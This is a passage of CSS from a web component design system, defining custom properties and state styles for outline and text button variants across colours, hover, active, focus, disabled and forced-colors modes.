                                        --_iconOutlineButton_web_icon_fg_indigo-pressed: var(--fg_onColor);
                                        --_iconOutlineButton_web_icon_fg_disabled: var(--fg_disabled);
                                        --_iconOutlineButton_web_text_fg_gray400: var(--fg_subtle);
                                        --_iconOutlineButton_web_text_fg_orange: var(--fg_primary);
                                        --_iconOutlineButton_web_text_fg_orange-hover: var(--fg_onColor);
                                        --_iconOutlineButton_web_text_fg_orange-pressed: var(--fg_onColor);
                                        --_iconOutlineButton_web_text_fg_white: var(--fg_inverse);
                                        --_iconOutlineButton_web_text_fg_white-pressed: var(--fg_onColor);
                                        --_iconOutlineButton_web_text_fg_white-hover: var(--fg_default);
                                        --_iconOutlineButton_web_text_fg_indigo: var(--fg_secondary);
                                        --_iconOutlineButton_web_text_fg_indigo-hover: var(--fg_onColor);
                                        --_iconOutlineButton_web_text_fg_indigo-pressed: var(--fg_onColor);
                                        --_iconOutlineButton_web_text_fg_disabled: var(--fg_disabled);
                                        --_iconOutlineButton_web_root_borderColor_gray400-initial: var(--border_default_color);
                                        --_iconOutlineButton_web_root_borderColor_gray400-focus: var(--border_info_color);
                                        --_iconOutlineButton_web_root_borderColor_orange-intial: var(--border_primary_color);
                                        --_iconOutlineButton_web_root_borderColor_orange-focus: var(--border_info_color);
                                        --_iconOutlineButton_web_root_borderColor_white-initial: var(--border_inverse_color);
                                        --_iconOutlineButton_web_root_borderColor_white-focus: var(--border_info-inverse_color);
                                        --_iconOutlineButton_web_root_borderColor_indigo-initial: var(--border_secondary_color);
                                        --_iconOutlineButton_web_root_borderColor_indigo-focus: var(--border_info_color);
                                        --_iconOutlineButton_web_root_borderColor_disabled: var(--border_disabled_color);
                                        --_iconOutlineButton_web_root_bg_gray400-hover: var(--bg_subtle);
                                        --_iconOutlineButton_web_root_bg_gray400-pressed: rgba(217, 217, 217, 0.6);
                                        --_iconOutlineButton_web_root_bg_orange-hover: var(--bg_primary);
                                        --_iconOutlineButton_web_root_bg_orange-pressed: rgba(255, 98, 0, 0.6);
                                        --_iconOutlineButton_web_root_bg_white-hover: var(--bg_default);
                                        --_iconOutlineButton_web_root_bg_white-pressed: rgba(255, 255, 255, 0.6);
                                        --_iconOutlineButton_web_root_bg_indigo-hover: var(--bg_secondary);
                                        --_iconOutlineButton_web_root_bg_indigo-pressed: rgba(82, 81, 153, 0.6)
                                    }

                                    :host,
                                    html {
                                        --_nextOutlineButton_web_root_borderWidth_indigo-focus: 0.063rem;
                                        --_nextOutlineButton_web_root_borderStyle_indigo-focus: var(--border_info_style);
                                        --_nextOutlineButton_web_root_borderWidth_indigo-initial: 0.063rem;
                                        --_nextOutlineButton_web_root_borderStyle_indigo-initial: var(--border_secondary_style);
                                        --_nextOutlineButton_web_root_borderWidth_indigo-pressed: 0.063rem;
                                        --_nextOutlineButton_web_root_borderStyle_indigo-pressed: var(--border_secondary_style);
                                        --_nextOutlineButton_web_root_borderWidth_white-focus: 0.063rem;
                                        --_nextOutlineButton_web_root_borderStyle_white-focus: var(--border_info-inverse_style);
                                        --_nextOutlineButton_web_root_borderWidth_white-initial: 0.063rem;
                                        --_nextOutlineButton_web_root_borderStyle_white-initial: var(--border_inverse_style);
                                        --_nextOutlineButton_web_root_borderWidth_disabled: 0.063rem;
                                        --_nextOutlineButton_web_root_borderStyle_disabled: var(--border_disabled_style);
                                        --_nextOutlineButton_web_text_fg_indigo: var(--fg_secondary);
                                        --_nextOutlineButton_web_text_fg_indigo-hover: var(--fg_onColor);
                                        --_nextOutlineButton_web_text_fg_indigo-pressed: var(--fg_onColor);
                                        --_nextOutlineButton_web_text_fg_white: var(--fg_inverse);
                                        --_nextOutlineButton_web_text_fg_white-hover: var(--fg_default);
                                        --_nextOutlineButton_web_text_fg_disabled: var(--fg_disabled);
                                        --_nextOutlineButton_web_icon_fg_indigo: var(--fg_secondary);
                                        --_nextOutlineButton_web_icon_fg_indigo-hover: var(--fg_onColor);
                                        --_nextOutlineButton_web_icon_fg_indigo-pressed: var(--fg_onColor);
                                        --_nextOutlineButton_web_icon_fg_white: var(--fg_inverse);
                                        --_nextOutlineButton_web_icon_fg_white-hover: var(--fg_subtle);
                                        --_nextOutlineButton_web_icon_fg_disabled: var(--fg_disabled);
                                        --_nextOutlineButton_web_root_borderColor_indigo-focus: var(--border_info_color);
                                        --_nextOutlineButton_web_root_borderColor_indigo-initial: var(--border_secondary_color);
                                        --_nextOutlineButton_web_root_borderColor_indigo-pressed: var(--border_secondary_color);
                                        --_nextOutlineButton_web_root_borderColor_white-focus: var(--border_info-inverse_color);
                                        --_nextOutlineButton_web_root_borderColor_white-initial: var(--border_inverse_color);
                                        --_nextOutlineButton_web_root_borderColor_disabled: var(--border_disabled_color);
                                        --_nextOutlineButton_web_root_bg_indigo-hover: var(--bg_secondary);
                                        --_nextOutlineButton_web_root_bg_indigo-pressed: rgba(82, 81, 153, 0.6);
                                        --_nextOutlineButton_web_root_bg_white-hover: var(--bg_default);
                                        --_nextOutlineButton_web_root_bg_white-pressed: rgba(255, 255, 255, 0.6)
                                    }

                                    :host,
                                    html {
                                        --_previousOutlineButton_web_root_borderWidth_indigo-initial: 0.063rem;
                                        --_previousOutlineButton_web_root_borderStyle_indigo-initial: var(--border_secondary_style);
                                        --_previousOutlineButton_web_root_borderWidth_indigo-focus: 0.063rem;
                                        --_previousOutlineButton_web_root_borderStyle_indigo-focus: var(--border_info_style);
                                        --_previousOutlineButton_web_root_borderWidth_white-initial: 0.063rem;
                                        --_previousOutlineButton_web_root_borderStyle_white-initial: var(--border_inverse_style);
                                        --_previousOutlineButton_web_root_borderWidth_white-focus: 0.063rem;
                                        --_previousOutlineButton_web_root_borderStyle_white-focus: var(--border_info-inverse_style);
                                        --_previousOutlineButton_web_root_borderWidth_disabled: 0.063rem;
                                        --_previousOutlineButton_web_root_borderStyle_disabled: var(--border_disabled_style);
                                        --_previousOutlineButton_web_text_fg_indigo: var(--fg_secondary);
                                        --_previousOutlineButton_web_text_fg_indigo-hover: var(--fg_onColor);
                                        --_previousOutlineButton_web_text_fg_indigo-pressed: var(--fg_onColor);
                                        --_previousOutlineButton_web_text_fg_white: var(--fg_inverse);
                                        --_previousOutlineButton_web_text_fg_white-hover: var(--fg_default);
                                        --_previousOutlineButton_web_text_fg_disabled: var(--fg_disabled);
                                        --_previousOutlineButton_web_icon_fg_indigo: var(--fg_secondary);
                                        --_previousOutlineButton_web_icon_fg_indigo-hover: var(--fg_onColor);
                                        --_previousOutlineButton_web_icon_fg_indigo-pressed: var(--fg_onColor);
                                        --_previousOutlineButton_web_icon_fg_white: var(--fg_inverse);
                                        --_previousOutlineButton_web_icon_fg_white-hover: var(--fg_subtle);
                                        --_previousOutlineButton_web_icon_fg_disabled: var(--fg_disabled);
                                        --_previousOutlineButton_web_root_borderColor_indigo-initial: var(--border_secondary_color);
                                        --_previousOutlineButton_web_root_borderColor_indigo-focus: var(--border_info_color);
                                        --_previousOutlineButton_web_root_borderColor_white-initial: var(--border_inverse_color);
                                        --_previousOutlineButton_web_root_borderColor_white-focus: var(--border_info-inverse_color);
                                        --_previousOutlineButton_web_root_borderColor_disabled: var(--border_disabled_color);
                                        --_previousOutlineButton_web_root_bg_indigo-hover: var(--bg_secondary);
                                        --_previousOutlineButton_web_root_bg_indigo-pressed: rgba(82, 81, 153, 0.6);
                                        --_previousOutlineButton_web_root_bg_white-hover: var(--bg_default);
                                        --_previousOutlineButton_web_root_bg_white-pressed: rgba(255, 255, 255, 0.6)
                                    }

                                    :host([outline]) {
                                        border-width: 1px;
                                        border-style: var(--_outlineButton_web_root_borderStyle_orange-initial);
                                        border-color: var(--_outlineButton_web_root_borderColor_orange-initial);
                                        background-color: transparent;
                                        color: var(--_outlineButton_web_text_fg_orange)
                                    }

                                    :host([outline]) ::slotted([slot="icon-before"]),
                                    :host([outline]) ::slotted([slot="icon-after"]) {
                                        fill: var(--_outlineButton_web_text_fg_orange)
                                    }

                                    :host([outline][indigo]) {
                                        border-width: 1px;
                                        border-style: var(--_outlineButton_web_root_borderStyle_indigo-initial);
                                        border-color: var(--_outlineButton_web_root_borderColor_indigo-initial);
                                        color: var(--_outlineButton_web_text_fg_indigo)
                                    }

                                    :host([outline][indigo]) ::slotted([slot="icon-before"]) {
                                        fill: var(--_previousOutlineButton_web_icon_fg_indigo)
                                    }

                                    :host([outline][indigo]) ::slotted([slot="icon-after"]) {
                                        fill: var(--_outlineButton_web_text_fg_indigo)
                                    }

                                    :host([outline][sky]) {
                                        border-width: 1px;
                                        border-style: var(--_outlineButton_web_root_borderStyle_sky-initial);
                                        border-color: var(--_outlineButton_web_root_borderColor_sky-initial);
                                        color: var(--_outlineButton_web_text_fg_sky)
                                    }

                                    :host([outline][sky]) ::slotted([slot="icon-before"]),
                                    :host([outline][sky]) ::slotted([slot="icon-after"]) {
                                        fill: var(--_outlineButton_web_text_fg_sky)
                                    }

                                    :host([outline][grey]) {
                                        border-width: 1px;
                                        border-style: var(--_outlineButton_web_root_borderStyle_gray400-initial);
                                        border-color: var(--_outlineButton_web_root_borderColor_gray400-initial);
                                        color: var(--_outlineButton_web_text_fg_gray400)
                                    }

                                    :host([outline][grey]) ::slotted([slot="icon-before"]),
                                    :host([outline][grey]) ::slotted([slot="icon-after"]) {
                                        fill: var(--_outlineButton_web_text_fg_gray400)
                                    }

                                    :host([outline][inverted]) {
                                        border-width: 1px;
                                        border-style: var(--_outlineButton_web_root_borderStyle_white-initial);
                                        border-color: var(--_outlineButton_web_root_borderColor_white-initial);
                                        color: var(--_outlineButton_web_text_fg_white)
                                    }

                                    :host([outline][inverted]) ::slotted([slot="icon-before"]) {
                                        fill: var(--_previousOutlineButton_web_icon_fg_white)
                                    }

                                    :host([outline][inverted]) ::slotted([slot="icon-after"]) {
                                        fill: var(--_outlineButton_web_text_fg_white)
                                    }

                                    :host([outline]:hover) {
                                        border-width: 0;
                                        background-color: var(--_outlineButton_web_root_bg_orange-hover);
                                        color: var(--_outlineButton_web_text_fg_hover)
                                    }

                                    :host([outline]:focus:hover) {
                                        box-shadow: inset 0 0 0 4px var(--border_focus-inner_color)
                                    }

                                    :host([outline]:hover) ::slotted([slot="icon-before"]) {
                                        fill: var(--_previousOutlineButton_web_icon_fg_indigo-hover)
                                    }

                                    :host([outline]:hover) ::slotted([slot="icon-after"]) {
                                        fill: var(--_nextOutlineButton_web_icon_fg_indigo-hover)
                                    }

                                    :host([outline][indigo]:hover) {
                                        background-color: var(--_outlineButton_web_root_bg_indigo-hover);
                                        color: var(--_outlineButton_web_text_fg_hover)
                                    }

                                    :host([outline][sky]:hover) {
                                        background-color: var(--_outlineButton_web_root_bg_sky-hover);
                                        color: var(--_outlineButton_web_text_fg_hover)
                                    }

                                    :host([outline][grey]:hover) {
                                        background-color: var(--_outlineButton_web_root_bg_gray400-hover);
                                        color: var(--_outlineButton_web_text_fg_gray400-hover)
                                    }

                                    :host([outline][grey]:hover) ::slotted([slot="icon-before"]),
                                    :host([outline][grey]:hover) ::slotted([slot="icon-after"]) {
                                        fill: var(--_outlineButton_web_text_fg_gray400-hover)
                                    }

                                    :host([outline][inverted]:hover) {
                                        background-color: var(--_outlineButton_web_root_bg_white-hover);
                                        color: var(--_outlineButton_web_text_fg_white-hover)
                                    }

                                    :host([outline][inverted]:hover) ::slotted([slot="icon-before"]) {
                                        fill: var(--_previousOutlineButton_web_icon_fg_white-hover)
                                    }

                                    :host([outline][inverted]:hover) ::slotted([slot="icon-after"]) {
                                        fill: var(--_outlineButton_web_text_fg_white-hover)
                                    }

                                    :host([outline]:active),
                                    :host([outline][active]) {
                                        border-width: 0;
                                        background-color: var(--_outlineButton_web_root_bg_orange-pressed);
                                        color: var(--_outlineButton_web_text_fg_pressed)
                                    }

                                    :host([outline]:active) ::slotted([slot="icon-before"]),
                                    :host([outline][active]) ::slotted([slot="icon-before"]) {
                                        fill: var(--_previousOutlineButton_web_icon_fg_indigo-pressed)
                                    }

                                    :host([outline]:active) ::slotted([slot="icon-after"]),
                                    :host([outline][active]) ::slotted([slot="icon-after"]) {
                                        fill: var(--_nextOutlineButton_web_icon_fg_indigo-pressed)
                                    }

                                    :host([outline][indigo]:active),
                                    :host([outline][indigo][active]) {
                                        background-color: var(--_outlineButton_web_root_bg_indigo-pressed);
                                        color: var(--_outlineButton_web_text_fg_pressed)
                                    }

                                    :host([outline][sky]:active),
                                    :host([outline][sky][active]) {
                                        background-color: var(--_outlineButton_web_root_bg_sky-pressed);
                                        color: var(--_outlineButton_web_text_fg_pressed)
                                    }

                                    :host([outline][grey]:active),
                                    :host([outline][grey][active]) {
                                        background-color: var(--_outlineButton_web_root_bg_gray400-pressed);
                                        color: var(--_outlineButton_web_text_fg_gray400-pressed)
                                    }

                                    :host([outline][grey]:active) ::slotted([slot="icon-before"]),
                                    :host([outline][grey]:active) ::slotted([slot="icon-after"]),
                                    :host([outline][grey][active]) ::slotted([slot="icon-before"]),
                                    :host([outline][grey][active]) ::slotted([slot="icon-after"]) {
                                        fill: var(--_outlineButton_web_text_fg_gray400-pressed)
                                    }

                                    :host([outline][inverted]:active),
                                    :host([outline][inverted][active]) {
                                        background-color: var(--_outlineButton_web_root_bg_white-pressed);
                                        color: var(--_outlineButton_web_text_fg_pressed)
                                    }

                                    :host([outline][inverted]:active) ::slotted([slot="icon-before"]),
                                    :host([outline][inverted]:active) ::slotted([slot="icon-after"]),
                                    :host([outline][inverted][active]) ::slotted([slot="icon-before"]),
                                    :host([outline][inverted][active]) ::slotted([slot="icon-after"]) {
                                        fill: var(--_outlineButton_web_root_bg_white-pressed)
                                    }

                                    :host([outline]:focus) {
                                        box-shadow: inset 0 0 0 3px var(--border_focus-inner_color);
                                        outline: 2px solid var(--border_focus-outer_color);
                                        outline-offset: -2px
                                    }

                                    :host([outline][disabled]) {
                                        border-width: 1px;
                                        border-style: var(--_outlineButton_web_root_borderStyle_disabled);
                                        border-color: var(--_outlineButton_web_root_borderWidth_disabled);
                                        color: var(--_outlineButton_web_text_fg_disabled)
                                    }

                                    :host([outline][disabled]) ::slotted([slot="icon-before"]) {
                                        fill: var(--_previousOutlineButton_web_icon_fg_disabled)
                                    }

                                    :host([outline][disabled]) ::slotted([slot="icon-after"]) {
                                        fill: var(--_outlineButton_web_text_fg_disabled)
                                    }

                                    :host([outline]:not(:hover, :active, [active])) {
                                        padding-top: 7px;
                                        padding-right: 15px;
                                        padding-bottom: 7px;
                                        padding-left: 15px
                                    }

                                    :host([outline][font16]:not(:hover, :active, [active])) {
                                        padding-top: 5px;
                                        padding-right: 11px;
                                        padding-bottom: 5px;
                                        padding-left: 11px
                                    }

                                    :host([outline][font14]:not(:hover, :active, [active])) {
                                        padding-top: 5px;
                                        padding-right: 9px;
                                        padding-bottom: 5px;
                                        padding-left: 9px
                                    }

                                    :host([outline][font12]:not(:hover, :active, [active])) {
                                        padding-top: 5px;
                                        padding-right: 7px;
                                        padding-bottom: 5px;
                                        padding-left: 7px
                                    }

                                    @media (forced-colors:active) {
                                        :host([outline]) {
                                            border-color: ButtonBorder
                                        }

                                        :host([outline]) ::slotted([slot="icon-before"]),
                                        :host([outline]) ::slotted([slot="icon-after"]) {
                                            fill: ButtonText
                                        }

                                        :host([outline]:hover),
                                        :host([outline][sky]:hover),
                                        :host([outline][indigo]:hover),
                                        :host([outline][grey]:hover),
                                        :host([outline]:focus),
                                        :host([outline][sky]:focus),
                                        :host([outline][indigo]:focus),
                                        :host([outline][grey]:focus) {
                                            border-width: 1px;
                                            border-color: Highlight;
                                            color: Highlight
                                        }

                                        :host([outline]:hover) ::slotted([slot="icon-before"]),
                                        :host([outline]:hover) ::slotted([slot="icon-after"]),
                                        :host([outline]:focus) ::slotted([slot="icon-before"]),
                                        :host([outline]:focus) ::slotted([slot="icon-after"]) {
                                            fill: Highlight
                                        }

                                        :host([outline][active]) {
                                            border-width: 1px;
                                            border-color: SelectedItem;
                                            color: SelectedItem
                                        }

                                        :host([outline][active]) ::slotted([slot="icon-before"]),
                                        :host([outline][active]) ::slotted([slot="icon-after"]) {
                                            fill: SelectedItem
                                        }

                                        :host([outline][disabled]) {
                                            border-color: GrayText;
                                            color: GrayText
                                        }

                                        :host([outline][disabled]) ::slotted([slot="icon-before"]),
                                        :host([outline][disabled]) ::slotted([slot="icon-after"]) {
                                            fill: GrayText
                                        }
                                    }
                                    </style>
                                    <style>
                                    :host,
                                    html {
                                        --_textButton_web_root_borderWidth_indigo-focus: 0.063rem;
                                        --_textButton_web_root_borderStyle_indigo-focus: var(--border_info_style);
                                        --_textButton_web_root_borderWidth_indigo-hover: 0.063rem;
                                        --_textButton_web_root_borderStyle_indigo-hover: var(--border_secondary_style);
                                        --_textButton_web_root_borderWidth_gray600-focus: 0.063rem;
                                        --_textButton_web_root_borderStyle_gray600-focus: var(--border_info_style);
                                        --_textButton_web_root_borderWidth_orange-focus: 0.063rem;
                                        --_textButton_web_root_borderStyle_orange-focus: var(--border_info_style);
                                        --_textButton_web_root_borderWidth_orange-hover: 0.063rem;
                                        --_textButton_web_root_borderStyle_orange-hover: var(--border_primary_style);
                                        --_textButton_web_root_borderWidth_white-focus: 0.063rem;
                                        --_textButton_web_root_borderStyle_white-focus: var(--border_info-inverse_style);
                                        --_textButton_web_root_borderWidth_white-hover: 0.063rem;
                                        --_textButton_web_root_borderStyle_white-hover: var(--border_inverse_style);
                                        --_textButton_web_text_fg_indigo: var(--fg_secondary);
                                        --_textButton_web_text_fg_hover: var(--fg_onColor);
                                        --_textButton_web_text_fg_indigo-pressed: var(--fg_onColor);
                                        --_textButton_web_text_fg_gray600: var(--fg_default);
                                        --_textButton_web_text_fg_orange: var(--fg_primary);
                                        --_textButton_web_text_fg_orange-pressed: var(--fg_onColor);
                                        --_textButton_web_text_fg_white: var(--fg_inverse);
                                        --_textButton_web_text_fg_white-pressed: var(--fg_onColor);
                                        --_textButton_web_text_fg_white-hover: var(--fg_default);
                                        --_textButton_web_text_fg_disabled: var(--fg_disabled);
                                        --_textButton_web_root_borderColor_indigo-focus: var(--border_info_color);
                                        --_textButton_web_root_borderColor_indigo-hover: var(--border_secondary_color);
                                        --_textButton_web_root_borderColor_gray600-focus: var(--border_info_color);
                                        --_textButton_web_root_borderColor_orange-focus: var(--border_info_color);
                                        --_textButton_web_root_borderColor_orange-hover: var(--border_primary_color);
                                        --_textButton_web_root_borderColor_white-focus: var(--border_info-inverse_color);
                                        --_textButton_web_root_borderColor_white-hover: var(--border_inverse_color);
                                        --_textButton_web_root_bg_indigo-focus: var(--bg_default);
                                        --_textButton_web_root_bg_indigo-hover: var(--bg_secondary);
                                        --_textButton_web_root_bg_indigo-pressed: rgba(82, 81, 153, 0.6);
                                        --_textButton_web_root_bg_gray600-focus: var(--bg_default);
                                        --_textButton_web_root_bg_gray600-pressed: rgba(217, 217, 217, 0.6);
                                        --_textButton_web_root_bg_gray600-hover: var(--bg_subtle);
                                        --_textButton_web_root_bg_orange-focus: var(--bg_default);
                                        --_textButton_web_root_bg_orange-hover: var(--bg_primary);
                                        --_textButton_web_root_bg_orange-pressed: rgba(255, 98, 0, 0.6);
                                        --_textButton_web_root_bg_white-hover: var(--bg_default);
                                        --_textButton_web_root_bg_white-pressed: rgba(255, 255, 255, 0.6)
                                    }

                                    :host,
                                    html {
                                        --_iconTextButton_web_root_borderWidth_white-focus: 0.063rem;
                                        --_iconTextButton_web_root_borderStyle_white-focus: var(--border_info-inverse_style);
                                        --_iconTextButton_web_root_borderWidth_orange-focus: 0.063rem;
                                        --_iconTextButton_web_root_borderStyle_orange-focus: var(--border_info_style);
                                        --_iconTextButton_web_icon_fg_white: var(--fg_inverse);
                                        --_iconTextButton_web_icon_fg_white-hover: var(--fg_default);
                                        --_iconTextButton_web_icon_fg_orange: var(--fg_primary);
                                        --_iconTextButton_web_icon_fg_sky: var(--fg_info);
                                        --_iconTextButton_web_icon_fg_orange-pressed: var(--fg_onColor);
                                        --_iconTextButton_web_icon_fg_orange-hover: var(--fg_onColor);
                                        --_iconTextButton_web_icon_fg_disabled: var(--fg_disabled);
                                        --_iconTextButton_web_icon_fg_gray400: var(--fg_default);
                                        --_iconTextButton_web_icon_fg_indigo: var(--fg_secondary);
                                        --_iconTextButton_web_icon_fg_indigo-hover: var(--fg_onColor);
                                        --_iconTextButton_web_icon_fg_indigo-pressed: var(--fg_onColor);
                                        --_iconTextButton_web_text_fg_white: var(--fg_inverse);
                                        --_iconTextButton_web_text_fg_white-hover: var(--fg_default);
                                        --_iconTextButton_web_text_fg_orange: var(--fg_primary);
                                        --_iconTextButton_web_text_fg_sky: var(--fg_info);
                                        --_iconTextButton_web_text_fg_sky-pressed: var(--fg_onColor);
                                        --_iconTextButton_web_text_fg_orange-pressed: var(--fg_onColor);
                                        --_iconTextButton_web_text_fg_orange-hover: var(--fg_onColor);
                                        --_iconTextButton_web_text_fg_disabled: var(--fg_disabled);
                                        --_iconTextButton_web_text_fg_gray400: var(--fg_subtle);
                                        --_iconTextButton_web_text_fg_indigo: var(--fg_secondary);
                                        --_iconTextButton_web_text_fg_indigo-hover: var(--fg_onColor);
                                        --_iconTextButton_web_text_fg_indigo-pressed: var(--fg_onColor);
                                        --_iconTextButton_web_root_borderColor_white-focus: var(--border_info-inverse_color);
                                        --_iconTextButton_web_root_borderColor_orange-focus: var(--border_info_color);
                                        --_iconTextButton_web_root_bg_white-hover: var(--bg_default);
                                        --_iconTextButton_web_root_bg_white-pressed: rgba(255, 255, 255, 0.6);
                                        --_iconTextButton_web_root_bg_orange-hover: var(--bg_primary);
                                        --_iconTextButton_web_root_bg_orange-pressed: rgba(255, 98, 0, 0.6);
                                        --_iconTextButton_web_root_bg_sky-hover: var(--bg_info);
                                        --_iconTextButton_web_root_bg_sky-pressed: rgba(85, 155, 209, 0.6);
                                        --_iconTextButton_web_root_bg_indigo-hover: var(--bg_secondary);
                                        --_iconTextButton_web_root_bg_indigo-pressed: rgba(82, 81, 153, 0.6)
                                    }

                                    :host,
                                    html {
                                        --_nextTextButton_web_root_borderWidth_indigo-focus: 0.063rem;
                                        --_nextTextButton_web_root_borderStyle_indigo-focus: var(--border_info_style);
                                        --_nextTextButton_web_root_borderWidth_white-focus: 0.063rem;
                                        --_nextTextButton_web_root_borderStyle_white-focus: var(--border_info-inverse_style);
                                        --_nextTextButton_web_text_fg_indigo: var(--fg_secondary);
                                        --_nextTextButton_web_text_fg_indigo-hover: var(--fg_onColor);
                                        --_nextTextButton_web_text_fg_indigo-pressed: var(--fg_onColor);
                                        --_nextTextButton_web_text_fg_white: var(--fg_inverse);
                                        --_nextTextButton_web_text_fg_white-hover: var(--fg_default);
                                        --_nextTextButton_web_text_fg_disabled: var(--fg_disabled);
                                        --_nextTextButton_web_icon_fg_indigo: var(--fg_secondary);
                                        --_nextTextButton_web_icon_fg_indigo-hover: var(--fg_onColor);
                                        --_nextTextButton_web_icon_fg_indigo-pressed: var(--fg_onColor);
                                        --_nextTextButton_web_icon_fg_white: var(--fg_inverse);
                                        --_nextTextButton_web_icon_fg_white-hover: var(--fg_subtle);
                                        --_nextTextButton_web_icon_fg_disabled: var(--fg_disabled);
                                        --_nextTextButton_web_root_borderColor_indigo-focus: var(--border_info_color);
                                        --_nextTextButton_web_root_borderColor_white-focus: var(--border_info-inverse_color);
                                        --_nextTextButton_web_root_bg_indigo-hover: var(--bg_secondary);
                                        --_nextTextButton_web_root_bg_indigo-pressed: rgba(82, 81, 153, 0.6);
                                        --_nextTextButton_web_root_bg_white-hover: var(--bg_default);
                                        --_nextTextButton_web_root_bg_white-pressed: rgba(255, 255, 255, 0.6);
                                        --_nextTextButton_web_root_bg_gray-hover: var(--bg_subtle);
                                        --_nextTextButton_web_root_bg_gray-pressed: rgba(217, 217, 217, 0.6)
                                    }

                                    :host,
                                    html {
                                        --_previousTextButton_web_root_borderWidth_indigo-focus: 0.063rem;
                                        --_previousTextButton_web_root_borderStyle_indigo-focus: var(--border_info_style);
                                        --_previousTextButton_web_root_borderWidth_white-focus: 0.063rem;
                                        --_previousTextButton_web_root_borderStyle_white-focus: var(--border_info-inverse_style);
                                        --_previousTextButton_web_text_fg_indigo: var(--fg_secondary);
                                        --_previousTextButton_web_text_fg_indigo-hover: var(--fg_onColor);
                                        --_previousTextButton_web_text_fg_indigo-pressed: var(--fg_onColor);
                                        --_previousTextButton_web_text_fg_white: var(--fg_inverse);
                                        --_previousTextButton_web_text_fg_white-hover: var(--fg_default);
                                        --_previousTextButton_web_text_fg_disabled: var(--fg_disabled);
                                        --_previousTextButton_web_icon_fg_indigo: var(--fg_secondary);
                                        --_previousTextButton_web_icon_fg_indigo-hover: var(--fg_onColor);
                                        --_previousTextButton_web_icon_fg_indigo-pressed: var(--fg_onColor);
                                        --_previousTextButton_web_icon_fg_white: var(--fg_inverse);
                                        --_previousTextButton_web_icon_fg_white-hover: var(--fg_subtle);
                                        --_previousTextButton_web_icon_fg_disabled: var(--fg_disabled);
                                        --_previousTextButton_web_root_borderColor_indigo-focus: var(--border_info_color);
                                        --_previousTextButton_web_root_borderColor_white-focus: var(--border_info-inverse_color);
                                        --_previousTextButton_web_root_bg_indigo-hover: var(--bg_secondary);
                                        --_previousTextButton_web_root_bg_indigo-pressed: rgba(82, 81, 153, 0.6);
                                        --_previousTextButton_web_root_bg_white-hover: var(--bg_default);
                                        --_previousTextButton_web_root_bg_white-pressed: rgba(255, 255, 255, 0.6)
                                    }

                                    :host([text]) {
                                        background-color: transparent;
                                        color: var(--_textButton_web_text_fg_indigo)
                                    }

                                    :host([text]) ::slotted([slot="icon-before"]) {
                                        fill: var(--_previousTextButton_web_icon_fg_indigo)
                                    }

                                    :host([text]) ::slotted([slot="icon-after"]) {
                                        fill: var(--_textButton_web_text_fg_indigo)
                                    }

                                    :host([text][grey]) {
                                        color: var(--_textButton_web_text_fg_gray600)
                                    }

                                    :host([text][grey]) ::slotted([slot="icon-before"]),
                                    :host([text][grey]) ::slotted([slot="icon-after"]) {
                                        fill: var(--_textButton_web_text_fg_gray600)
                                    }

                                    :host([text][orange]) {
                                        color: var(--_textButton_web_text_fg_orange)
                                    }

                                    :host([text][orange]) ::slotted([slot="icon-before"]),
                                    :host([text][orange]) ::slotted([slot="icon-after"]) {
                                        fill: var(--_textButton_web_text_fg_orange)
                                    }

                                    :host([text][inverted]) {
                                        background-color: transparent;
                                        color: var(--_textButton_web_text_fg_white)
                                    }

                                    :host([text][inverted]) ::slotted([slot="icon-before"]) {
                                        fill: var(--_previousTextButton_web_icon_fg_white)
                                    }

                                    :host([text][inverted]) ::slotted([slot="icon-after"]) {
                                        fill: var(--_textButton_web_text_fg_white)
                                    }

                                    :host([text]:hover) {
                                        background-color: var(--_textButton_web_root_bg_indigo-hover);
                                        color: var(--_textButton_web_text_fg_hover)
                                    }

                                    :host([text]:hover) ::slotted([slot="icon-before"]) {
                                        fill: var(--_previousTextButton_web_icon_fg_indigo-hover)
                                    }

                                    :host([text]:hover) ::slotted([slot="icon-after"]) {
                                        fill: var(--_nextTextButton_web_icon_fg_indigo-hover)
                                    }

                                    :host([text][orange]:hover) ::slotted([slot="icon-before"]) {
                                        fill: var(--_previousTextButton_web_icon_fg_indigo-hover)
                                    }

                                    :host([text][orange]:hover) ::slotted([slot="icon-after"]) {
                                        fill: var(--_nextTextButton_web_icon_fg_indigo-hover)
                                    }

                                    :host([text][grey]:hover) {
                                        background-color: var(--_textButton_web_root_bg_gray600-hover);
                                        color: var(--_textButton_web_text_fg_gray600)
                                    }

                                    :host([text][grey]:hover) ::slotted([slot="icon-before"]),
                                    :host([text][grey]:hover) ::slotted([slot="icon-after"]) {
                                        fill: var(--_textButton_web_text_fg_gray600)
                                    }

                                    :host([text][orange]:hover) {
                                        background-color: var(--_textButton_web_root_bg_orange-hover);
                                        color: var(--_textButton_web_text_fg_hover)
                                    }

                                    :host([text][inverted]:hover) {
                                        background-color: var(--_textButton_web_root_bg_white-hover);
                                        color: var(--_textButton_web_text_fg_white-hover)
                                    }

                                    :host([text][inverted]:hover) ::slotted([slot="icon-before"]) {
                                        fill: var(--_previousTextButton_web_icon_fg_white-hover)
                                    }

                                    :host([text][inverted]:hover) ::slotted([slot="icon-after"]) {
                                        fill: var(--_textButton_web_text_fg_white-hover)
                                    }

                                    :host([text]:active),
                                    :host([text][active]) {
                                        background-color: var(--_textButton_web_root_bg_indigo-pressed);
                                        color: var(--_textButton_web_text_fg_indigo-pressed)
                                    }

                                    :host([text]:active) ::slotted([slot="icon-before"]),
                                    :host([text][active]) ::slotted([slot="icon-before"]) {
                                        fill: var(--_previousTextButton_web_icon_fg_indigo-pressed)
                                    }

                                    :host([text]:active) ::slotted([slot="icon-after"]),
                                    :host([text][active]) ::slotted([slot="icon-after"]) {
                                        fill: var(--_textButton_web_text_fg_indigo-pressed)
                                    }

                                    :host([text][grey]:active),
                                    :host([text][grey][active]) {
                                        background-color: var(--_textButton_web_root_bg_gray600-pressed);
                                        color: var(--_textButton_web_text_fg_gray600)
                                    }

                                    :host([text][grey]:active) ::slotted([slot="icon-before"]),
                                    :host([text][grey]:active) ::slotted([slot="icon-after"]),
                                    :host([text][grey][active]) ::slotted([slot="icon-before"]),
                                    :host([text][grey][active]) ::slotted([slot="icon-after"]) {
                                        fill: var(--_textButton_web_text_fg_gray600)
                                    }

                                    :host([text][orange]:active),
                                    :host([text][orange][active]) {
                                        background-color: var(--_textButton_web_root_bg_orange-pressed);
                                        color: var(--_textButton_web_text_fg_orange-pressed)
                                    }

                                    :host([text][inverted]:active),
                                    :host([text][inverted][active]) {
                                        background-color: var(--_textButton_web_root_bg_white-pressed);
                                        color: var(--_textButton_web_text_fg_white-pressed)
                                    }

                                    :host([text]:active) ::slotted([slot="icon-before"]),
                                    :host([text][active]) ::slotted([slot="icon-before"]) {
